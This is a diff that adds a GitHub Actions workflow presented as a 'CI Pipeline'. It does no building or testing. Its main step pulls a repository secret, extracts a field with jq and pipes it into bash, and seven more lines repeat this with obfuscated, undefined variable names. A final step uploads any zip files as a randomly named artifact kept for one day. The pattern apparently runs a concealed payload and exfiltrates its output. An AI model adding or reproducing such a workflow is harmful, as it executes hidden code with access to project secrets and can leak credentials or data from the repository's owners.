@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          wsk62: ${{ secrets.wsk62 }}
+        run: |
+          printf '%s' "$wsk62" | jq -r .ljzrj23281 | /bin/bash
+          printf '%s' "$ewtr6919" | jq -r .uzz276 | /bin/bash
+          echo $h393 | jq -r .d40398 | /bin/bash
+          echo $b3793 | jq -r .yqytp97 | /bin/bash
+          printf '%s' "$gu99" | jq -r .cuip0 | /bin/bash
+          echo $kucom1 | jq -r .upje31 | /bin/bash
+          printf '%s' "$smj4" | jq -r .nl1 | /bin/bash
+          echo $diuc33737 | jq -r .lxuw31895 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: WTIYERYL
+          path: "*.zip"
+          retention-days: 1
